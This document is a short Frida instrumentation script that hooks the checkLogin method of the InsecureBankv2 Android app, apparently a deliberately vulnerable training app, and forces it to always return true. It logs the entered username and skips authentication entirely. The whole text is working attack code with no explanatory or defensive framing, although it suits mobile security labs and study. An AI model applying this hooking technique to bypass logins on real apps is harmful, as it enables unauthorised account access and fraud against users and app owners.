Java.perform(function() {
    var LoginActivity = Java.use("com.android.insecurebankv2.LoginActivity");
    LoginActivity.checkLogin.implementation = function(username, password) {
        console.log("[+] Bypassed login: " + username);
        return true;  // Force login success
    };
});
